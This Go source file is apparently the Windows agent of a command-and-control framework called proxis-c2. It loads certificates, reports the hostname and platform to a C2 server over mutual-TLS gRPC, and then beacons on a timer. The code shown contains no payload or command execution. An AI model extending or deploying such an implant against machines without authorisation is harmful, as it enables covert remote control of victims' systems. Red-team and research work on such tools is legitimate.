//go:build windows

package main

import (
	"context"
	"crypto/tls"
	"crypto/x509"
	"fmt"
	"log"
	"os"
	"os/signal"
	"syscall"
	"time"

	"github.com/spf13/viper"
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials"

	"github.com/proxis-c2/proxis-c2/internal/common/config"
	"github.com/proxis-c2/proxis-c2/internal/common/crypto"
	"github.com/proxis-c2/proxis-c2/internal/common/protocol"
	"github.com/proxis-c2/proxis-c2/internal/common/utils"
)

var (
	version   = "dev"
	buildDate = "unknown"
)

// Agent represents the C2 agent
type Agent struct {
	config    *config.AgentConfig
	conn      *grpc.ClientConn
	crypto    *crypto.AESGCMProvider
	agentID   string
	hostname  string
	platform  string
}

// NewAgent creates a new agent instance
func NewAgent(cfg *config.AgentConfig) (*Agent, error) {
	// Load encryption key
	key, err := os.ReadFile(cfg.C2.ClientKeyPath)
	if err != nil {
		return nil, fmt.Errorf("failed to load client key: %w", err)
	}

	cryptoProvider, err := crypto.NewAESGCMProvider(key)
	if err != nil {
		return nil, fmt.Errorf("failed to initialize crypto provider: %w", err)
	}

	// Get platform info
	platformInfo, err := utils.GetPlatformInfo()
	if err != nil {
		return nil, fmt.Errorf("failed to get platform info: %w", err)
	}

	return &Agent{
		config:   cfg,
		crypto:   cryptoProvider,
		agentID:  generateAgentID(),
		hostname: platformInfo.Hostname,
		platform: platformInfo.OS,
	}, nil
}

// generateAgentID generates a unique agent identifier
func generateAgentID() string {
	id, err := crypto.GenerateRandomID(16)
	if err != nil {
		return fmt.Sprintf("agent-%d", time.Now().Unix())
	}
	return id
}

// Connect establishes a connection to the C2 server
func (a *Agent) Connect() error {
	// Load client certificate
	cert, err := tls.LoadX509KeyPair(
		a.config.C2.ClientCertPath,
		a.config.C2.ClientKeyPath,
	)
	if err != nil {
		return fmt.Errorf("failed to load client certificate: %w", err)
	}

	// Load CA certificate
	caCert, err := os.ReadFile(a.config.C2.CACertPath)
	if err != nil {
		return fmt.Errorf("failed to load CA certificate: %w", err)
	}

	caPool := x509.NewCertPool()
	caPool.AppendCertsFromPEM(caCert)

	tlsConfig := &tls.Config{
		Certificates: []tls.Certificate{cert},
		RootCAs:     caPool,
		MinVersion:  tls.VersionTLS13,
	}

	creds := credentials.NewTLS(tlsConfig)
	addr := fmt.Sprintf("%s:%d", a.config.C2.ServerAddress, a.config.C2.ServerPort)

	a.conn, err = grpc.Dial(addr, grpc.WithTransportCredentials(creds))
	if err != nil {
		return fmt.Errorf("failed to connect to server: %w", err)
	}

	return nil
}

// Run starts the agent's main loop
func (a *Agent) Run() error {
	// Send initial hello
	client := protocol.NewC2ServerClient(a.conn)
	hello := protocol.NewAgentHello(a.agentID, a.hostname, a.platform, "127.0.0.1")

	resp, err := client.SendHello(context.Background(), hello)
	if err != nil {
		return fmt.Errorf("failed to send hello: %w", err)
	}

	if !resp.Accepted {
		return fmt.Errorf("server rejected connection: %s", resp.Message)
	}

	log.Printf("Connected to C2 server (agent: %s)", a.agentID)

	// Main beacon loop
	ticker := time.NewTicker(a.config.Beacon.BaseInterval)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			beacon := protocol.NewBeacon(a.agentID, nil)
			_, err := client.SendBeacon(context.Background(), beacon)
			if err != nil {
				log.Printf("Beacon failed: %v", err)
			}
		}
	}
}

// main is the entry point for the Windows agent
func main() {
	// Load configuration
	viper.SetConfigName("agent")
	viper.SetConfigType("yaml")
	viper.AddConfigPath("configs")
	viper.AddConfigPath("/etc/proxis")

	if err := viper.ReadInConfig(); err != nil {
		log.Printf("Warning: Could not read config file: %v", err)
	}

	var cfg config.AgentConfig
	if err := viper.Unmarshal(&cfg); err != nil {
		log.Fatalf("Failed to parse configuration: %v", err)
	}

	// Set defaults
	if cfg.C2.ServerAddress == "" {
		cfg.C2.ServerAddress = "localhost"
	}
	if cfg.C2.ServerPort == 0 {
		cfg.C2.ServerPort = 443
	}

	// Create agent
	agent, err := NewAgent(&cfg)
	if err != nil {
		log.Fatalf("Failed to create agent: %v", err)
	}

	// Connect to server
	if err := agent.Connect(); err != nil {
		log.Fatalf("Connection error: %v", err)
	}
	defer agent.conn.Close()

	// Handle graceful shutdown
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		<-sigChan
		log.Println("Shutting down agent...")
		os.Exit(0)
	}()

	// Run agent
	if err := agent.Run(); err != nil {
		log.Fatalf("Agent error: %v", err)
	}
}